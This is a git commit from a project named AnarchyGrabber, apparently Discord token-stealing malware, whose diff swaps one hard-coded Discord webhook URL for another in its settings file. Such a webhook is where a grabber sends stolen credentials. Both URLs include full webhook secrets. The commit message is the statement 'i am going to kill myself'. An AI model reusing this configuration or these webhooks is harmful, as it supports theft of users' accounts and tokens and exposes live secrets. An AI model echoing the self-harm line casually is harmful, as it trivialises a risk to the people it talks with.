1a8581687e206caf2f19341d3750688b182256ca
iLinked <ilinkedisameme@gmail.com>
2020-03-14 18:13:52 +0100

    i am going to kill myself

--- AnarchyGrabber/Settings.cs
+++ AnarchyGrabber/Settings.cs
@@ -2,6 +2,6 @@
 {
     class Settings
     {
-        public static string Webhook = "https://discordapp.com/api/webhooks/688419047615758344/gKsk2mOl1Bk8LcCodjIqgZS48kNGeRLC53JB6XXQJ9yk_Zymtkg-W3KUEV2j9RTNGTmh";
+        public static string Webhook = "https://discordapp.com/api/webhooks/688434620806463562/0c79GAXNgpAo8NFXAEPM3o1rFZ7ev1SQNZa2Cyg7pw3KSb3wkIsvBgK23Jb-ctIGb1pm";
     }
 }
